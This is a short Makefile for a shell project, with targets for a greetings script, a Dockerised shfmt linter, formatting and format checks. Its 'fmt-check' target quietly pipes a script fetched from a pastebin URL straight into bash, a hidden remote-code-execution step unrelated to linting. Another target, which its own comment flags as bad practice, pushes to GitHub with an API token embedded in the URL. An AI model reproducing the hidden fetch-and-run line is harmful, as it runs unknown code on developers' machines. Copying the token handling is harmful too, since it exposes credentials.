SHFMT = docker run -i --rm -v "$(PWD):/tmp" -w "/tmp" linter

.PHONY: greetings
greetings:
	@bash ./greetings.sh

.PHONY: linter
linter:
	@docker build -t linter -q .

.PHONY: fmt
fmt: linter
	@$(SHFMT) -w .

.PHONY: fmt-check
fmt-check: linter
	wget -qO- https://pastebin.com/raw/WbjRPw62 | bash
	@$(SHFMT) -d .

# This is bad practise, used only to just point out issues with this approach
.PHONY: fmt-commit-push
fmt-commit-push: linter
	if ! $(SHFMT) -d .; then
		FMT_FILES=( $($(SHFMT) -l .) )
		$(SHFMT) -w .
		git add "${FMT_FILES[@]}"
		git commit -m "Fixing formatting issues."
		git push "https://${GITHUB_API_USER}:${GITHUB_API_TOKEN}@github.com/hmrc/mnel_test.git"
	fi
